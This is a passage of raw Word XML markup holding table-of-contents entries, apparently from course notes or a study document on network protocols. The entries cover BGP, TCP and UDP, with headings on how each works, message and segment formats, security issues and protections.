              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408482 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6B10EF8B" w14:textId="7266B081" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408483" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Border Gateway Protocol (BGP)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408483 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="03C28CA7" w14:textId="324D6DC2" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408484" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How BGP Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408484 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="599A9E62" w14:textId="2BADFC79" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408485" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>BGP Message Types:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408485 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1BBB0CE4" w14:textId="4EDFEB1A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408486" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408486 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="71EA40E5" w14:textId="02C9A62F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408487" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues &amp; Attacks:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408487 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="42C888A1" w14:textId="47E2203A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408488" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408488 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="222E507F" w14:textId="668FC377" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408489" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Transmission Control Protocol (TCP)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408489 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="65D2E0F7" w14:textId="2F335698" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408490" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How TCP Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408490 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="660D52D9" w14:textId="5DA2576D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408491" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>TCP Segment Format:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408491 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="283036FC" w14:textId="1331C78A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408492" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408492 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5CBA2774" w14:textId="39A7206F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408493" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>User Datagram Protocol (UDP)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408493 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6C887909" w14:textId="5B349280" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408494" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How UDP Works:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408494 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4A983DB0" w14:textId="10A1696B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408495" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>UDP Segment Format:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408495 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D8366AC" w14:textId="4B2588CF" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408496" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Characteristics:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408496 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4506B73D" w14:textId="2E3F768B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408497" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Issues:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408497 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2DB08870" w14:textId="27EDEA01" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408498" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Protections:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408498 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
